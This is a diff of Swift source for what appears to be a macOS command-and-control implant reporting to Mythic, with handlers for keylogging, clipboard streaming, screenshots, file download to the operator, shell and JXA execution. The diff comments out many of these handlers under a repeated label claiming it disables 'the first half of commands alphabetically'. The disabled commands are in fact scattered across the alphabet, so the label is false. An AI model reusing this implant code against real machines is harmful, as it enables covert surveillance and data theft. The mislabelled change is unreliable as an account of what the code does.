@@ -172,12 +172,15 @@ func executeTask(job: Job, jobList: JobList) {
     switch job.command {
     case "pwd":
         pwd(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "cd":
         cd(job: job)
     case "exit":
         exit(job: job)
     case "cat":
         cat(job: job)
+    */
     case "run":
         runBinary(job: job)
     case "shell":
@@ -188,14 +191,19 @@ func executeTask(job: Job, jobList: JobList) {
         ps(job: job)
     case "sleep":
         sleep(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY  
+    /*
     case "jobs":
         listJobs(job: job, jobList: jobList)
     case "jobkill":
         jobKill(job: job, jobList: jobList)
+    */
     case "ls":
         ls(job: job)
     case "rm":
         rm(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "download":
         // Download job has no file_id from Mythic yet, we need to get one, if we have a file_id, get a chunk
         if job.downloadFileID == "" {
@@ -205,15 +213,19 @@ func executeTask(job: Job, jobList: JobList) {
         else {
             downloadChunk(job: job)
         }
+    */
     case "upload":
         // Only perform the write function after the first upload response
         if job.uploadTotalChunks >= 1 {
             upload(job: job)
         }
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "clipboard":
         if job.status == "" {
             clipboard(job: job)
         }
+    */
     case "screenshot":
         // Gather total number of displays to download
         if job.screenshotTotalDisplays == 0 {
@@ -243,17 +255,23 @@ func executeTask(job: Job, jobList: JobList) {
         }
     case "mkdir":
         makeDirectory(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "keylog":
         if job.status != "keylog_started" {
             let swiftSpy = SwiftSpy()
             swiftSpy.keylog(job: job)
         }
+    */
     case "whoami":
         whoami(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "fda_check":
         fullDiskAccessCheck(job: job)
     case "env":
         getEnvironmentVariables(job: job)
+    */
     case "setenv":
         setEnvironmentVariable(job: job)
     case "unsetenv":
@@ -262,6 +280,8 @@ func executeTask(job: Job, jobList: JobList) {
         listTCCDatabase(job: job)
     case "mv":
         mv(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "cp":
         cp(job: job)
     case "hostname":
@@ -277,16 +297,23 @@ func executeTask(job: Job, jobList: JobList) {
         }
     case "jxa_call":
         jxa_call(job: job)
+    */
     case "plist_print":
         plist_print(job: job)
     case "kill":
         killProcess(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "get_execution_context":
         getExecutionContext(job: job)
+    */
     case "tcc_folder_check":
         tccFolderCheck(job: job)
+    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+    /*
     case "accessibility_check":
         accessibilityCheck(job: job)
+    */
     default:
         job.result = "Command not implemented."
         job.status = "error"
@@ -315,6 +342,8 @@ func postResponse(jobList: JobList) {
         }
         
         // Handle jxa_import jobs
+        // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+        /*
         if job.command == "jxa_import" {
             // Increase chunk number, starts at 0
             job.uploadChunkNumber += 1
@@ -336,6 +365,7 @@ func postResponse(jobList: JobList) {
                 jsonJobOutput.append(jsonResponse)
             }
         }
+        */
         
         // Handle upload jobs
         if job.command == "upload" {
@@ -362,6 +392,8 @@ func postResponse(jobList: JobList) {
         }
         
         // Handle download jobs
+        // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+        /*
         if job.command == "download" {
             // We don't have a file_id yet, request one from Mythic
             if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
@@ -397,6 +429,7 @@ func postResponse(jobList: JobList) {
                 job.downloadChunkNumber = job.downloadChunkNumber + 1
             }
         }
+        */
         
         // Handle screenshot jobs
         if job.command == "screenshot" {
@@ -436,6 +469,8 @@ func postResponse(jobList: JobList) {
         }
         
         // Handle keylog jobs
+        // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+        /*
         if job.command == "keylog" {
             job.keylogBuffer += keylogBuffer
             keylogBuffer = ""
@@ -448,8 +483,11 @@ func postResponse(jobList: JobList) {
             job.keylogBuffer = ""
             jsonJobOutput.append(jsonResponse)
         }
+        */
         
         // Continuously stream clipboard data
+        // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+        /*
         if job.command == "clipboard" {
             let jsonResponse = JSON([
                 "task_id": job.taskID,
@@ -458,6 +496,7 @@ func postResponse(jobList: JobList) {
             job.result = ""
             jsonJobOutput.append(jsonResponse)
         }
+        */
     }
     
     let jsonPayload = JSON([
@@ -487,6 +526,8 @@ func postResponse(jobList: JobList) {
                         print("job removed")
                     }
                     // Handle jxa_import responses
+                    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+                    /*
                     else if job.command == "jxa_import" {
                         // Save total chunks + chunk_data from first upload message
                         if ((job.uploadTotalChunks == 0) && (responses["total_chunks"].exists())) {
@@ -507,6 +548,7 @@ func postResponse(jobList: JobList) {
                     else if job.command == "exit" {
                         exit(0)
                     }
+                    */
                     // Handle screenshot responses
                     else if job.command == "screenshot" {
                         // Save file_id returned from Mythic for first download message
@@ -532,6 +574,8 @@ func postResponse(jobList: JobList) {
                         }
                     }
                     // Handle download responses
+                    // DISABLED FOR TESTING - FIRST HALF OF COMMANDS ALPHABETICALLY
+                    /*
                     else if job.command == "download" {
                         // Save file_id returned from Mythic for first download message
                         if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
@@ -546,6 +590,7 @@ func postResponse(jobList: JobList) {
                             jobList.jobs.remove(at: index)
                         }
                     }
+                    */
                     // Handle upload responses
                     else if job.command == "upload" {
                         // Save total chunks + chunk_data from first upload message
